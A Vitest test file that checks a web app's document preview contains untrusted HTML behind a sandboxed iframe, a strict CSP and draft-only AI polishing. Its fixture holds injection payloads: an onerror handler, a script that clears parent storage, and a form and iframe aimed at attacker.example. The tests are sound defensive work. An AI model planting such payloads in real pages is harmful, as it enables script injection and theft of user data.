import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { DocumentPreviewFrame } from '@/components/documents/DocumentPreviewFrame';
import { buildDocumentPreviewSrcDoc, DOCUMENT_PREVIEW_CSP } from '@/lib/documentPreview';

const MALICIOUS_HTML = [
  '<img src="https://attacker.example/pixel" onerror="parent.document.body.dataset.pwned=1">',
  '<script>parent.localStorage.clear()</script>',
  '<form action="https://attacker.example/collect"><input name="secret"></form>',
  '<iframe src="https://attacker.example/frame"></iframe>',
].join('');

describe('document preview stored-HTML containment', () => {
  it('renders untrusted HTML only inside an opaque, scriptless iframe sandbox', () => {
    const markup = renderToStaticMarkup(
      <DocumentPreviewFrame untrustedHtml={MALICIOUS_HTML} title="Document preview" />,
    );

    expect(markup).toContain('<iframe');
    expect(markup).toContain('title="Document preview"');
    expect(markup).toContain('sandbox=""');
    expect(markup).not.toContain('allow-scripts');
    expect(markup).not.toContain('allow-same-origin');
    expect(markup).toContain('referrerPolicy="no-referrer"');
  });

  it('places a deny-by-default CSP before the stored HTML', () => {
    const srcDoc = buildDocumentPreviewSrcDoc(MALICIOUS_HTML);
    const policyOffset = srcDoc.indexOf('Content-Security-Policy');
    const payloadOffset = srcDoc.indexOf(MALICIOUS_HTML);

    expect(policyOffset).toBeGreaterThan(-1);
    expect(payloadOffset).toBeGreaterThan(policyOffset);
    expect(DOCUMENT_PREVIEW_CSP).toContain("default-src 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("script-src 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("connect-src 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("object-src 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("frame-src 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("form-action 'none'");
    expect(DOCUMENT_PREVIEW_CSP).toContain("base-uri 'none'");
  });

  it('keeps the panel free of a same-document raw HTML sink', () => {
    const panelSource = readFileSync(
      join(process.cwd(), 'src/components/documents/DocumentGeneratorPanel.tsx'),
      'utf8',
    );

    expect(panelSource).toContain('<DocumentPreviewFrame');
    expect(panelSource).not.toContain('dangerouslySetInnerHTML');
  });

  it('does not present an upstream AI failure as a successful polish', () => {
    const panelSource = readFileSync(
      join(process.cwd(), 'src/components/documents/DocumentGeneratorPanel.tsx'),
      'utf8',
    );
    const edgeSource = readFileSync(
      join(process.cwd(), 'supabase/functions/document-ai-polish/index.ts'),
      'utf8',
    );

    expect(panelSource).toContain('if (!res.ok)');
    expect(panelSource.indexOf('if (!res.ok)')).toBeLessThan(
      panelSource.indexOf('setPreviewHtml(res.polished_html)'),
    );
    expect(edgeSource).toMatch(/AI request failed" \},\s*502,/);
  });

  it('keeps finalized document content immutable during AI polish', () => {
    const edgeSource = readFileSync(
      join(process.cwd(), 'supabase/functions/document-ai-polish/index.ts'),
      'utf8',
    );
    const lifecycleCheck = edgeSource.indexOf('if (doc.status !== "draft")');
    const aiRequest = edgeSource.indexOf('await fetch("https://api.anthropic.com/v1/messages"');
    const persistedUpdate = edgeSource.indexOf('.update({ content_html: polishedHtml })');

    expect(edgeSource).toContain('generated_by, status');
    expect(lifecycleCheck).toBeGreaterThan(-1);
    expect(lifecycleCheck).toBeLessThan(aiRequest);
    expect(edgeSource.slice(persistedUpdate)).toContain('.eq("status", "draft")');
    expect(edgeSource.slice(persistedUpdate)).toContain('.select("id")');
    expect(edgeSource).toContain('Document is no longer an editable draft');
  });
});
